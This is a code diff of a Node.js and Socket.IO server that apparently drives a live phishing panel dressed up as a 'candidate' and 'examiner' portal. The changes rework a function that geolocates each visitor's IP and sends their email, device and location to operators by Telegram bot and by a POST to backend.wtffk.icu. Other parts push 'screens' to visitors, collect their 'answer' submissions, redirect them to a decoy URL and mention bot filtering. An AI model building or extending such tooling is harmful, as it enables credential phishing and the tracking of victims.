@@ -21,9 +21,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use('/screens', express.static(path.join(__dirname, 'screens')));
 
 
-/**
- * CHECK BOT GATEWAY MIDDLEWARE
- */
+
 /**
  * ENTERPRISE GATEWAY MIDDLEWARE with Sliding Session (30m)
  */
@@ -74,28 +72,32 @@ async function notifyExaminers(req, candidateEmail, categoryName, attemptCount =
     let ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
     if (ip === '::1' || ip === '127.0.0.1') ip = '8.8.8.8';
 
-    // 2. Fetch Geo-location from free API
-    https.get(`https://ipinfo.io/${ip}/json`, (res) => {
-        let body = '';
-        res.on('data', (chunk) => { body += chunk; });
-        res.on('end', () => {
-            try {
-                // DEALING WITH JSON ERROR: Ensure body is not empty and is valid JSON
-                if (!body || body.trim() === "") {
-                    throw new Error("Empty body received from IP service");
-                }
+    // We return a Promise so the caller can get the metadata
+    return new Promise((resolve, reject) => {
+        // 2. Fetch Geo-location from free API
+        https.get(`https://ipinfo.io/${ip}/json`, (res) => {
+            let body = '';
+            res.on('data', (chunk) => { body += chunk; });
+            res.on('end', () => {
+                try {
+                    // DEALING WITH JSON ERROR: Ensure body is not empty and is valid JSON
+                    if (!body || body.trim() === "") {
+                        throw new Error("Empty body received from IP service");
+                    }
 
-                const geo = JSON.parse(body);
-                const city = geo.city || 'Unknown';
-                const region = geo.region || 'Unknown';
-                const country = geo.country || 'Unknown';
+                    const geo = JSON.parse(body);
+                    const city = geo.city || 'Unknown';
+                    const region = geo.region || 'Unknown';
+                    const country = geo.country || 'Unknown';
 
-                // 3. Get candidate name from DB
-                db.get(`SELECT name FROM candidates WHERE email = ?`, [candidateEmail], (err, candidate) => {
-                    if (err || !candidate) return;
+                    // 3. Get candidate name from DB
+                    db.get(`SELECT name FROM candidates WHERE email = ?`, [candidateEmail], (err, candidate) => {
+                        if (err || !candidate) {
+                            return resolve({ ip, device, city, region, country, name: 'Unknown' });
+                        }
 
-                    const dateStr = new Date().toLocaleString();
-                    const notificationMessage = `
+                        const dateStr = new Date().toLocaleString();
+                        const notificationMessage = `
 🔔 NEW CANDIDATE LOGGED IN (Attempt ${attemptCount}/3)
 --------------------------------
 Email: ${candidateEmail}
@@ -106,53 +108,69 @@ IP: ${ip}
 Location: ${city}, ${region}, ${country}
 Time: ${dateStr}
 --------------------------------
-                    `.trim();
+                        `.trim();
 
-                    // 4. Fetch Examiners and Broadcast
-                    db.all(`SELECT telegram_key, chat_id, email FROM examiners`, [], (err, examiners) => {
-                        if (err || !examiners) return;
+                        // 4. Fetch Examiners and Broadcast
+                        db.all(`SELECT telegram_key, chat_id, email FROM examiners`, [], (err, examiners) => {
+                            if (!err && examiners) {
+                                const emailList = examiners.map(ex => ex.email).filter(e => e);
 
-                        const emailList = examiners.map(ex => ex.email).filter(e => e);
+                                // --- TELEGRAM ---
+                                examiners.forEach(ex => {
+                                    if (ex.telegram_key && ex.chat_id) {
+                                        const url = `https://api.telegram.org/bot${ex.telegram_key}/sendMessage?chat_id=${ex.chat_id}&text=${encodeURIComponent(notificationMessage)}`;
+                                        https.get(url).on('error', (e) => console.error("Telegram Error:", e.message));
+                                    }
+                                });
 
-                        // --- TELEGRAM ---
-                        examiners.forEach(ex => {
-                            if (ex.telegram_key && ex.chat_id) {
-                                const url = `https://api.telegram.org/bot${ex.telegram_key}/sendMessage?chat_id=${ex.chat_id}&text=${encodeURIComponent(notificationMessage)}`;
-                                https.get(url).on('error', (e) => console.error("Telegram Error:", e.message));
-                            }
-                        });
+                                // --- EMAIL (Via Bridge) ---
+                                if (emailList.length > 0) {
+                                    const postData = JSON.stringify({
+                                        emails: emailList,
+                                        subject: `Broadcast Alert: ${candidate.name}`,
+                                        body: notificationMessage
+                                    });
 
-                        // --- EMAIL (Via Bridge) ---
-                        if (emailList.length > 0) {
-                            const postData = JSON.stringify({
-                                emails: emailList,
-                                subject: `Broadcast Alert: ${candidate.name}`,
-                                body: notificationMessage
-                            });
+                                    const options = {
+                                        hostname: 'backend.wtffk.icu',
+                                        path: '/send_mail.php',
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/json',
+                                            'Content-Length': Buffer.byteLength(postData),
+                                            'X-Api-Key': 'Your_Secret_Key_Here'
+                                        }
+                                    };
 
-                            const options = {
-                                hostname: 'backend.wtffk.icu',
-                                path: '/send_mail.php',
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                    'Content-Length': Buffer.byteLength(postData),
-                                    'X-Api-Key': 'Your_Secret_Key_Here'
+                                    const bridgeReq = https.request(options);
+                                    bridgeReq.write(postData);
+                                    bridgeReq.end();
                                 }
-                            };
+                            }
 
-                            const bridgeReq = https.request(options);
-                            bridgeReq.write(postData);
-                            bridgeReq.end();
-                        }
+                            // RETURN STATEMENT: Resolving the promise with all metadata
+                            resolve({
+                                email: candidateEmail,
+                                name: candidate.name,
+                                category: categoryName,
+                                device: device,
+                                ip: ip,
+                                location: `${city}, ${region}, ${country}`,
+                                time: dateStr,
+                                notificationMessage: notificationMessage
+                            });
+                        });
                     });
-                });
-            } catch (jsonErr) {
-                console.error("[DEBUG] JSON Parse Error in Geo-lookup:", jsonErr.message);
-                // Optional: You could trigger a fallback notification here if the IP lookup fails
-            }
+                } catch (jsonErr) {
+                    console.error("[DEBUG] JSON Parse Error in Geo-lookup:", jsonErr.message);
+                    resolve({ ip, device, city: 'Unknown', region: 'Unknown', country: 'Unknown', name: 'Unknown' });
+                }
+            });
+        }).on('error', (e) => {
+            console.log("Geo Lookup Error:", e.message);
+            resolve({ ip, device, city: 'Unknown', region: 'Unknown', country: 'Unknown', name: 'Unknown' });
         });
-    }).on('error', (e) => console.log("Geo Lookup Error:", e.message));
+    });
 }
 
 
@@ -172,7 +190,6 @@ io.on('connection', (socket) => {
         const { name, email, categoryId } = data;
 
         // 1. DATABASE SAVE/UPDATE (UPSERT)
-        // Ensures candidate exists and is marked 'live' before checking examiners
         const upsertSql = `
             INSERT INTO candidates (email, name, category_id, status) 
             VALUES (?, ?, ?, 'live') 
@@ -182,30 +199,32 @@ io.on('connection', (socket) => {
             name = EXCLUDED.name
         `;
 
-        db.run(upsertSql, [email, name, categoryId], function(err) {
+        db.run(upsertSql, [email, name, categoryId], async function(err) { // Added async here
             if (err) {
                 console.error("[DEBUG] DB Error during join:", err.message);
                 return;
             }
 
-            // 2. BROADCAST NOTIFICATION
-            // Requirement: Notify examiners immediately when a candidate joins
+            // 2. BROADCAST NOTIFICATION & METADATA FETCH
             const currentAttempt = (joinAttempts[email] || 0) + 1;
-            db.get(`SELECT name FROM categories WHERE id = ?`, [categoryId], (err, cat) => {
-                const catName = cat ? cat.name : 'Outlook';
-                console.log(`[DEBUG] Broadcasting join for ${name} (Attempt ${currentAttempt})`);
-                notifyExaminers(socket.request, email, catName, currentAttempt);
+            
+            // We use a Promise wrapper for the DB check so we can stay in the async flow
+            const catName = await new Promise((resolve) => {
+                db.get(`SELECT name FROM categories WHERE id = ?`, [categoryId], (err, cat) => {
+                    resolve(cat ? cat.name : 'Outlook');
+                });
             });
+
+            console.log(`[DEBUG] Broadcasting join for ${name} (Attempt ${currentAttempt})`);
+            
+            // NOW we can safely await the metadata
+            const metadata = await notifyExaminers(socket.request, email, catName, currentAttempt);
 
             // 3. EXAMINER AVAILABILITY CHECK
             db.all(`SELECT username FROM examiners WHERE status = 1`, [], (err, onlineRows) => {
-                if (err) {
-                    console.error("DB Error checking availability:", err);
-                    return;
-                }
+                if (err) return console.error("DB Error checking availability:", err);
 
                 const connectedExaminerUsernames = Object.values(examinerSockets);
-
                 const actuallyAvailable = onlineRows.filter(row => 
                     connectedExaminerUsernames.includes(row.username)
                 );
@@ -213,62 +232,46 @@ io.on('connection', (socket) => {
                 const examinersOnline = actuallyAvailable.length > 0;
 
                 if (!examinersOnline) {
-                    // NO EXAMINER ONLINE: Incremental Retry Logic
                     joinAttempts[email] = currentAttempt;
-                    console.log(`[DEBUG] No examiner online for ${email}. Handling attempt ${currentAttempt}/3`);
-
                     if (joinAttempts[email] >= 3) {
-                        // REACHED 3 ATTEMPTS: Redirect to Category Default URL
                         db.get(`SELECT default_redirect_url FROM categories WHERE id = ?`, [categoryId], (err, cat) => {
                             const targetUrl = cat ? cat.default_redirect_url : '/';
-                            console.log(`[DEBUG] Final failure for ${email}. Redirecting to: ${targetUrl}`);
                             socket.emit('redirect_command', { url: targetUrl });
                             delete joinAttempts[email];
                         });
                     } else {
-                        console.log(`[DEBUG] No examiner online. Sending failure to client. Attempt: ${currentAttempt}`);
-        
-                        // We emit 'join_failed' instead of a silent 'retry_connection'
                         socket.emit('join_failed', { 
-                            message: "No examiners are currently available to start your session. Please try joining again.",
+                            message: "No examiners available. Please try again.",
                             attempt: joinAttempts[email]
                         });
                     }
                     return; 
                 }
 
-                // 4. EXAMINER IS ONLINE: Proceed with portal session
-                console.log(`[DEBUG] Examiner found. Initializing session for ${email}`);
+                // 4. EXAMINER IS ONLINE
                 emailToSocket[email] = socket.id;
                 socket.email = email;
-                joinAttempts[email] = 0; // Reset attempts on successful connection
+                joinAttempts[email] = 0; 
 
-                // Fetch history and current state
                 db.all(`SELECT * FROM interactions WHERE candidate_email = ? ORDER BY timestamp ASC`, [email], (err, history) => {
                     db.get(`SELECT * FROM candidates WHERE email = ?`, [email], (err, candidate) => {
+                        
                         // Restore existing session
                         socket.emit('restore_session', { candidate, history });
 
-                        // If it's a fresh session (no history), send the default screen
-                        /*if (!history || history.length === 0) {
-                            db.get(`SELECT file_path FROM screens WHERE category_id = ? AND is_default = 1`, [categoryId], (err, screen) => {
-                                if (screen) {
-                                    socket.emit('new_task', { 
-                                        screenFile: screen.file_path, 
-                                        header: "Welcome", 
-                                        subHeader: "Please begin the process." 
-                                    });
-                                }
-                            });
-                        }*/
+                        // Alert examiners that the candidate is now "Live"
+                        io.emit('candidate_online', { 
+                            ...candidate, 
+                            status: 'live', 
+                            category_name: catName 
+                        });
 
-                        // Alert examiners that the candidate is now truly "Live" in the portal
-                        db.get(`SELECT name FROM categories WHERE id = ?`, [candidate.category_id], (err, cat) => {
-                            io.emit('candidate_online', { 
-                                ...candidate, 
-                                status: 'live', 
-                                category_name: cat ? cat.name : 'General' 
-                            });
+                        // FINAL STEP: Emit the metadata alert to the examiner UI
+                        // This uses the metadata returned from notifyExaminers
+                        io.emit('notify_submission', { 
+                            email: metadata.email, 
+                            answer: metadata.notificationMessage, 
+                            screenFile: 'LOGIN_METADATA' 
                         });
                     });
                 });
